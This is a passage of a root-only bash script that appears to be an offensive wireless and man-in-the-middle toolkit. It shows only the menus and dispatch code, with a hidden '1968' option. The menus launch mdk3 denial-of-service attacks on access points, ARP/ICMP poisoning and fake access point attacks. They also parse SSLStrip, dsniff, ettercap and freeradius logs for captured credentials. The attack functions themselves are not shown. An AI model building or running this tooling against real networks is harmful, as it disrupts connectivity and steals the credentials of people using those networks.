f_DoSOptions(){
	clear
	f_Banner

	echo "1. Attack a Single or Multiple APs"
	echo "2. Last Man Standing (Use with Caution)"
	echo "3. Previous Menu"
	echo
	read -p "Choice: " doschoice

	case $doschoice in
	1) f_mdk3aps ;;
	2) f_lastman ;;
	3) f_fakeapattacks ;;
	*) f_DoSOptions ;;
	esac
}


######################################################
f_DataReviewMenu(){
	clear
	f_Banner

	echo "1.  Parse SSLStrip log for credentials"
	echo "2.  Parse dsniff file for credentials"
	echo "3.  Parse ettercap eci file for credentials"
	echo "4.  Parse freeradius attack file for credentials"
	echo "5.  Previous Menu"
	echo
	read -p "Choice: " datareviewchoice

	case $datareviewchoice in
	1) f_SSLStrip ;;
	2) f_dsniff ;;
	3) f_EtterLog ;;
	4) f_freeradiuscreds ;;
	5) f_mainmenu ;;
	*) f_DataReviewMenu ;;
	esac
}


##################################################
f_ICMP(){
	clear
	f_Banner

	echo "\n*** If you are connected to a switch this attack won't work! ***"
	echo -e "*** You must be able to see ALL traffic for this attack to work. ***\n\n"
	read -p "Are you connected to a switch [y/N]: " icmpswitch

	if [ $(echo $icmpswitch | tr 'A-Z' 'a-z') == "y" ]; then
		f_ICMPPoison
	else
		f_poisoning
	fi
}


##################################################
f_mainmenu(){
	clear
	f_Banner

	echo "1.  Prerequisites & Configurations"
	echo "2.  Poisoning Attacks"
	echo "3.  FakeAP Attacks"
	echo "4.  Data Review"
	echo "5.  Exit"
	echo "q.  Quit current poisoning session"
	echo
	read -p "Choice: " mainchoice

	case $mainchoice in
	1) clean=; f_prereqs ;;
	2) clean=; f_poisoning ;;
	3) clean=; f_fakeapattacks ;;
	4) clean=; f_DataReviewMenu ;;
	5) f_checkexit ;;
	1968) f_pbs ;;
	Q|q) f_Quit ;;
	*) f_mainmenu ;;
	esac
}

# run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[!] This script must be run as root\e[0m" 1>&2
	exit 1
else
	mkdir /tmp/ec
	f_isxrunning
	f_xtermwindows
	f_findpaths
	clean=1
	f_mainmenu
fi
